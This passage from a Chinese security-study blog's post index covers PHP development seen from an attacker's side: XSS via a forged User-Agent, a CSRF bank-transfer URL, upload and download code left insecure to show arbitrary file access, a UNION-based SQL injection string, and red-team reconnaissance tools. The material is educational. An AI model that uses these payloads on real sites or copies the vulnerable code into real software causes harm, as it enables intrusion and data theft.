class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getIp</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>通过执行代码，我们可以输出相关的IP地址</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524091504620.png" alt="image-20240524091504620"></p><h3 id="实例-站长之家"><a href="#实例-站长之家" class="headerlink" title="实例-站长之家"></a>实例-站长之家</h3><p>站长之家通过我们与其数据交换过程中的数据包的UA头获取我们的IP地址及其他详细信息，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/77b70f3c8a24f1c992d5af70b20d8b4b.png" alt="77b70f3c8a24f1c992d5af70b20d8b4b"></p><p>此时我们可以通过BP进行抓包，修改UA头部信息，进而使得站长之家返回我们修改的内容，此时就可以插入恶意JS代码，但是这个案例已经被修复了，过滤了<code>&lt;script&gt;&lt;/script&gt;</code></p><h3 id="CSRF（跨站点请求伪造）"><a href="#CSRF（跨站点请求伪造）" class="headerlink" title="CSRF（跨站点请求伪造）"></a>CSRF（跨站点请求伪造）</h3><p>CSRF，是恶意站点或程序通过已认证用户的浏览器在受信任站点上执行非正常操作。可进行的恶意操作局限于已在网站通过身份验证的用户的功能</p><p>CSRF示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你的银行（bank.com）使用 GET 请求处理转账，其中包括几个参数（收款人身份以及转账的金额）</span><br><span class="line">例如，如果 Jim 想给他的朋友 Bob 10 美元，请求可能如下所示：</span><br><span class="line">http://bank.com/transfer?recipient=Bob&amp;amount=10</span><br><span class="line">现在，攻击者可能成功使 Jim 单击如下所示的链接（但已被巧妙的用缩短器或超链接缩短）：</span><br><span class="line">http://bank.com/transfer?recipient=Hacker&amp;amount=100000</span><br><span class="line">因为 Jim 已经登录，他的浏览器会将他的 cookie 和请求一并发送 — 所以他的银行相信他本人正在请求转账于是执行了转账请求</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
            <tag> CSRF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-文件上传下载删除</title>
      <link href="/post/174093a4.html"/>
      <url>/post/174093a4.html</url>
      
        <content type="html"><![CDATA[<p>通过实现PHP代码开发实现相关的功能，我们可以更好的了解漏洞产生的原理，以及那种方式会产生漏洞，哪种方式不会产生漏洞，以方便我们更好的选择相关的攻击方式</p><h2 id="文件上传类"><a href="#文件上传类" class="headerlink" title="文件上传类"></a>文件上传类</h2><p>文件上传类总共包括两种方式，一种是代码自主写，另一种是引用相关的富文本编辑器</p><h3 id="代码自主写"><a href="#代码自主写" class="headerlink" title="代码自主写"></a>代码自主写</h3><p>相关实现代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$file_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">@<span class="variable">$file_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">@<span class="variable">$file_tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">@<span class="variable">$file_error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"><span class="comment">//执行检测上传文件类型</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file_type</span>==<span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="string">&quot;<span class="subst">$file_tmpname</span>&quot;</span>,<span class="string">&quot;upload/&quot;</span>.<span class="variable">$file_name</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;上传成功！&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;upload/&quot;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传错误！只允许上传图片格式&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中$_FILES是PHP全局数组，用来展示上传文件的基本属性</p><p>move_uploaded_file(文件临时名，文件路径.文件名)，其中在php中一般使用.来连接变量名</p><h3 id="编辑器引用"><a href="#编辑器引用" class="headerlink" title="编辑器引用"></a>编辑器引用</h3><p>引用别人写的相关的编辑器为js文件，即使用别人封装好的代码，例如以下相关代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> charset=<span class="string">&quot;utf-8&quot;</span> src=<span class="string">&quot;../../ueditor/ueditor.config.js&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/cfece2b3058b9f22da991598381f511d.png" alt="img"></p><p>如果相关编辑器爆出相关漏洞，那么这个网站也会有相关漏洞，如果引用的编辑器没有任何漏洞，那么这个网站在文件上传方面就没有漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">总结：</span><br><span class="line">自写代码验证上传：验证核心在自己写的代码里</span><br><span class="line">引用外部编辑器实现：验证核心在编辑器</span><br><span class="line">引用开发框架实现：验证核心在相关框架</span><br></pre></td></tr></table></figure><h2 id="文件下载类"><a href="#文件下载类" class="headerlink" title="文件下载类"></a>文件下载类</h2><h3 id="直连URL访问"><a href="#直连URL访问" class="headerlink" title="直连URL访问"></a>直连URL访问</h3><p>相关代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filenameurl</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$url</span>=<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="string">&#x27;/blog/soft&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line"><span class="comment">#header(&quot;$url&quot;); //重定向到url网址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直连url下载，即访问相关url即下载相关文件，例如访问<code>http://www.xxx.com/xxx.zip</code>，会直接执行下载xxx.zip</p><p>但是直连下载也有一个特点，如果是zip、rar、png、jpg等文件，就会去下载，如果是php或者txt这一类文件，就会去执行，不会去下载，当然，php不会当作php执行，而是将其中的内容输出出来，并不会当作php文件执行</p><p>所以，如果是直连URL访问，那么是不可能存在漏洞的，因为参数是不可控的，就算传进去了php文件，也无法执行，只能看看</p><h3 id="传参下载"><a href="#传参下载" class="headerlink" title="传参下载"></a>传参下载</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file_name&quot;</span>];     <span class="comment">// 下载文件名</span></span><br><span class="line"><span class="variable">$file_dir</span> = <span class="string">&quot;./&quot;</span>;        <span class="comment">// 下载文件存放目录</span></span><br><span class="line"><span class="comment">// 检查文件是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file_dir</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 NOT FOUND&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 以只读和二进制模式打开文件</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_dir</span> . <span class="variable">$file_name</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉浏览器这是一个文件流格式的文件</span></span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="comment">// 请求范围的度量单位</span></span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Accept-Ranges: bytes&quot;</span>);</span><br><span class="line">    <span class="comment">// Content-Length是指定包含于请求或响应中数据的字节长度</span></span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Accept-Length: &quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$file_dir</span> . <span class="variable">$file_name</span>));</span><br><span class="line">    <span class="comment">// 用来告诉浏览器，文件是可以当做附件被下载，下载后的文件名称为$file_name该变量的值。</span></span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="variable">$file_name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取文件内容并直接输出到浏览器</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$file_dir</span> . <span class="variable">$file_name</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这串代码可以看出，传参下载的参数我们是可以控制的，并且传参下载是通过文件流的形式一点一点返回的，即无论是否是php还是zip，都会进行下载处理，并且php代码会被执行，并不是简简单单的打开php代码</p><p>所以这种方式进行文件下载是有漏洞的，如果后端没有对传入的参数进行过滤，我们就可以实现任意文件访问</p><p>形如<code>http://www.xxx.com/?filename=</code></p><h2 id="文件删除类"><a href="#文件删除类" class="headerlink" title="文件删除类"></a>文件删除类</h2><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filedel</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件夹删除"><a href="#文件夹删除" class="headerlink" title="文件夹删除"></a>文件夹删除</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filedeldir</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无论是文件还是文件夹的删除，如果导致了任意文件删除，那么非常可能造成源码被删，网站崩溃</p><h2 id="文件内容操作类"><a href="#文件内容操作类" class="headerlink" title="文件内容操作类"></a>文件内容操作类</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileread</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$f</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$name</span>,<span class="string">&quot;r&quot;</span>);<span class="comment">//fopen函数用来打开一个文件或者url，mode的r代表&quot;只读&quot;</span></span><br><span class="line"><span class="variable">$code</span>=@<span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$name</span>));<span class="comment">//fread（读取的文件，读取到哪个位置）函数代表读取打开的文件，filesize代表返回文件的最大字节，</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$code</span>;</span><br><span class="line">@<span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);<span class="comment">//关闭打开的文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filewrite</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$txt</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">fopen</span>(<span class="variable">$name</span>,<span class="string">&quot;a+&quot;</span>);<span class="comment">//以读写方式打开文件</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>,<span class="variable">$txt</span>);<span class="comment">//fwrite（写入的文件名，写入的内容）</span></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件读取和文件写入都存在后门植入的风险</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
            <tag> 文件操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-数据库操作</title>
      <link href="/post/4f390869.html"/>
      <url>/post/4f390869.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP开发常用工具"><a href="#PHP开发常用工具" class="headerlink" title="PHP开发常用工具"></a>PHP开发常用工具</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Navicat:可视化操作数据库，更方便进行数据库操作</span><br><span class="line">Dreamweaver:前端页面设计，可以实现实时展现相关代码样式</span><br><span class="line">phpStudy:PHP搭建环境，可以以localhost访问，是php学习的必备工具</span><br><span class="line">phpStorm:php开发IDE，进行PHP代码审计的时候，可以作为调试的很好的工具 </span><br></pre></td></tr></table></figure><h2 id="PHP入门语法（mysql连接）"><a href="#PHP入门语法（mysql连接）" class="headerlink" title="PHP入门语法（mysql连接）"></a>PHP入门语法（mysql连接）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP代码必须包含在<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>中</span><br><span class="line">PHP使用<span class="title function_ invoke__">mysql_connect</span>()来连接数据库，有三个参数，分别是servername,username,password,比如<span class="variable">$con</span> = <span class="title function_ invoke__">mysql_connect</span>(servername, username,password)</span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>()用来向数据库发送数据查询命令，例如<span class="title function_ invoke__">mysql_query</span>(select * <span class="keyword">from</span> mysql, <span class="variable">$con</span>)</span><br></pre></td></tr></table></figure><p>关于mysql数据库的几种基本php语法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.增：</span><br><span class="line">a.创建库 CREATE DATABASES database_name</span><br><span class="line">b.创建表 CREATE TABLE <span class="title function_ invoke__">table_name</span>(column_name1 data_type,column_name2 data_type,…)</span><br><span class="line">c.插入数据 INSERT INTO table_name <span class="title function_ invoke__">VALUES</span>(value1,value2,…)</span><br><span class="line"><span class="number">2</span>.删：DELETE FROM table_name WHERE column_name=value</span><br><span class="line"><span class="number">3</span>.查：SELECT column FROM table_name WHERE column operator value</span><br><span class="line"><span class="number">4</span>.改：UPDATE table_name SET column_name=WHERE column_name=value</span><br></pre></td></tr></table></figure><p>如下图示例所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240520203700512.png" alt="image-20240520203700512"></p><p>部分实现代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 你的数据库用户名</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>; <span class="comment">// 你的数据库密码</span></span><br><span class="line">        <span class="variable">$dbname</span> = <span class="string">&quot;myblog&quot;</span>; <span class="comment">// 你的数据库名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建连接</span></span><br><span class="line">        <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查连接</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT content FROM article&quot;</span>; <span class="comment">// 检索所有文章</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 输出数据</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;paragraph&#x27;&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;没有找到文章内容&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于每次都要执行数据库配置，所以我们可以把这部分代码写成一个配置文件，然后用文件包含进行引用，例如<code>include(&quot;/test/coon.php&quot;)</code>进行一个简单的引用，如果这部分参数可控，那么就可以实现文件包含的利用</p><h2 id="PHP变量提交"><a href="#PHP变量提交" class="headerlink" title="PHP变量提交"></a>PHP变量提交</h2><p>变量提交一共有三种方式，分别是get传参，post传参，request传参，由于get和post非常基础，这里只讲request传参</p><p>request封装了get、post、file、cookie四种传参方式，那么为什么要设计request传参方式呢？其实是为了简化后端程序设计，因为无论是哪种方式传递的数据，都是传递数据给web应用，他们的目的是一样的，所以我们可以用request涵盖所有</p><p>因为传递进来的参数是我们可控的，如果不对相关的参数进行过滤处理，就容易造成sql注入，这也是sql注入的原理</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240520205741049.png" alt="image-20240520205741049"></p><p>例如，对于本例，当我们对传进来的id写成<code>1 union select name from admin</code>这时就能外带出很多数据库内的其他信息</p><h2 id="PHP单引号和双引号区别"><a href="#PHP单引号和双引号区别" class="headerlink" title="PHP单引号和双引号区别"></a>PHP单引号和双引号区别</h2><p>通常刚刚接触到php的新手都会认为单引号和双引号是没有区别的，但其实区别还是蛮大的</p><p><strong>用一句话来解释，单引号不解析变量，双引号解析变量，有变量就用单引号</strong>，如下图示例所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;<span class="subst">$a</span> world&quot;</span>; <span class="comment">//使用双引号</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;$a world&#x27;</span>; <span class="comment">//使用单引号</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$str1</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$str2</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240520214031829.png" alt="image-20240520214031829"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
            <tag> 数据库连接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-红队工具篇</title>
      <link href="/post/78f1cbb0.html"/>
      <url>/post/78f1cbb0.html</url>
      
        <content type="html"><![CDATA[<h2 id="网络空间四大引擎"><a href="#网络空间四大引擎" class="headerlink" title="网络空间四大引擎"></a>网络空间四大引擎</h2><h3 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h3><p>对应网址：<a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240517092956678.png" alt="image-20240517092956678"></p><p>可以进行一些资产搜索，比如域名，中间件的查找</p><h3 id="Quake"><a href="#Quake" class="headerlink" title="Quake"></a>Quake</h3><p>类似于Fofa，<a href="https://quake.360.net/quake/#/index">360网络空间测绘 — 因为看见，所以安全</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240517105204978.png" alt="image-20240517105204978"></p><p>当然类似的还有Shodan和Zoomeye，这两个用的比较少，下面是相关网址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br></pre></td></tr></table></figure><h2 id="自动化收集工具"><a href="#自动化收集工具" class="headerlink" title="自动化收集工具"></a>自动化收集工具</h2><h3 id="ARL灯塔"><a href="#ARL灯塔" class="headerlink" title="ARL灯塔"></a>ARL灯塔</h3><p>ARL项目地址：<a href="https://github.com/Aabyss-Team/ARL">https://github.com/Aabyss-Team/ARL</a></p><p>官方的ARL现在已经停用，准备改成商用了，上方的项目是一个老哥保存的</p><p>ARL灯塔的功能</p><div class="table-container"><table><thead><tr><th>1</th><th style="text-align:center">任务名称</th><th style="text-align:center">任务名称</th></tr></thead><tbody><tr><td>2</td><td style="text-align:center">任务目标</td><td style="text-align:center">任务目标，支持IP，IP段和域名。可一次性下发多个目标</td></tr><tr><td>3</td><td style="text-align:center">域名爆破类型</td><td style="text-align:center">对域名爆破字典大小, 大字典：常用2万字典大小。测试：少数几个字典，常用于测试功能是否正常</td></tr><tr><td>4</td><td style="text-align:center">端口扫描类型</td><td style="text-align:center">ALL：全部端口，TOP1000：常用top 1000端口，TOP100：常用top 100端口，测试：少数几个端口</td></tr><tr><td>5</td><td style="text-align:center">域名爆破</td><td style="text-align:center">是否开启域名爆破</td></tr><tr><td>6</td><td style="text-align:center">DNS字典智能生成</td><td style="text-align:center">根据已有的域名生成字典进行爆破</td></tr><tr><td>7</td><td style="text-align:center">域名查询插件</td><td style="text-align:center">已支持的数据源为11个，<code>alienvault</code>, <code>certspotter</code>,<code>crtsh</code>,<code>fofa</code>,<code>hunter</code>等</td></tr><tr><td>8</td><td style="text-align:center">ARL 历史查询</td><td style="text-align:center">对arl历史任务结果进行查询用于本次任务</td></tr><tr><td>9</td><td style="text-align:center">端口扫描</td><td style="text-align:center">是否开启端口扫描，不开启站点会默认探测80,443</td></tr><tr><td>10</td><td style="text-align:center">服务识别</td><td style="text-align:center">是否进行服务识别，有可能会被防火墙拦截导致结果为空</td></tr><tr><td>11</td><td style="text-align:center">操作系统识别</td><td style="text-align:center">是否进行操作系统识别，有可能会被防火墙拦截导致结果为空</td></tr><tr><td>12</td><td style="text-align:center">SSL 证书获取</td><td style="text-align:center">对端口进行SSL 证书获取</td></tr><tr><td>13</td><td style="text-align:center">跳过CDN</td><td style="text-align:center">对判定为CDN的IP, 将不会扫描端口，并认为80，443是端口是开放的</td></tr><tr><td>14</td><td style="text-align:center">站点识别</td><td style="text-align:center">对站点进行指纹识别</td></tr><tr><td>15</td><td style="text-align:center">搜索引擎调用</td><td style="text-align:center">利用搜索引擎结果爬取对应的URL</td></tr><tr><td>16</td><td style="text-align:center">站点爬虫</td><td style="text-align:center">利用静态爬虫对站点进行爬取对应的URL</td></tr><tr><td>17</td><td style="text-align:center">站点截图</td><td style="text-align:center">对站点首页进行截图</td></tr><tr><td>18</td><td style="text-align:center">文件泄露</td><td style="text-align:center">对站点进行文件泄露检测，会被WAF拦截</td></tr><tr><td>19</td><td style="text-align:center">Host 碰撞</td><td style="text-align:center">对vhost配置不当进行检测</td></tr><tr><td>20</td><td style="text-align:center">nuclei 调用</td><td style="text-align:center">调用nuclei 默认PoC 对站点进行检测 ，会被WAF拦截，请谨慎使用该功能</td></tr></tbody></table></div><h3 id="Finger"><a href="#Finger" class="headerlink" title="Finger"></a>Finger</h3><p><code>下载地址：https://github.com/EASY233/Finger</code></p><p>集合fofa和360quake的全自动化收集工具，但是需要配置这两个单点工具的api</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/7b71fdba231943a4c2d26e35bf714b07.png" alt="image-20240118161401435"></p><h3 id="Kunyu"><a href="#Kunyu" class="headerlink" title="Kunyu"></a>Kunyu</h3><p>kunyu集合了Shodan和Zoomeye，下载地址:<code>https://github.com/knownsec/Kunyu</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8eb455f3612c9db07fbf26b4d57d56e0.png" alt="image-20240118165714343"></p><h3 id="Suize"><a href="#Suize" class="headerlink" title="Suize"></a>Suize</h3><p>全自动化信息收集工具</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9efeaf812dfb95919ea3478e219455e9.png" alt="image-20240122162857466"></p><p>上述工具各有优劣，具体哪个好哪个差还要根据自己使用来决定</p><h2 id="单点功能器"><a href="#单点功能器" class="headerlink" title="单点功能器"></a>单点功能器</h2><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><p><a href="https://github.com/shmilylty/OneForAll">shmilylty/OneForAll: OneForAll是一款功能强大的子域收集工具 (github.com)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/usage_example.svg" alt="Example"></p><h3 id="棱角社区"><a href="#棱角社区" class="headerlink" title="棱角社区"></a>棱角社区</h3><p>棱角上面展示了很多信息收集网址，就不在这一一列举</p><p>可以直接访问<a href="https://forum.ywhack.com/center.php">[~]#棱角 ::Edge.Forum* (ywhack.com)</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240517112839208.png" alt="image-20240517112839208"></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 红队工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-APP&amp;小程序的抓包、反编译、资产提取</title>
      <link href="/post/5fc26ca.html"/>
      <url>/post/5fc26ca.html</url>
      
        <content type="html"><![CDATA[<h2 id="APP内在提取-AppInfoScanner"><a href="#APP内在提取-AppInfoScanner" class="headerlink" title="APP内在提取-AppInfoScanner"></a>APP内在提取-AppInfoScanner</h2><p>AppInfoScanner是一种很好的提取app内部信息的集成化测试工具，可以很方便的提取出相应的信息，以满足我们的安全测试需求</p><h3 id="安装说明"><a href="#安装说明" class="headerlink" title="安装说明"></a>安装说明</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">下载地址:https://github.com/kelvinBen/AppInfoScanner</span><br></pre></td></tr></table></figure><p>在kali中输入如下命令</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240515103508866.png" alt="image-20240515103508866"></p><p>进入APPInfoScanner的主文件夹，安装我们所需要的环境依赖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>在安装相关依赖环境的时候，可能会出现frida无法安装成功，这个时候只需要打开我们的梯子，科学上网，重新pip就可以了</p><p>至此我们就搭建好了AppInfoScanner工具，我们接着就可以使用这个工具进行相关测试</p><h3 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h3><figure class="highlight python"><table><tr><td class="code"><pre><span 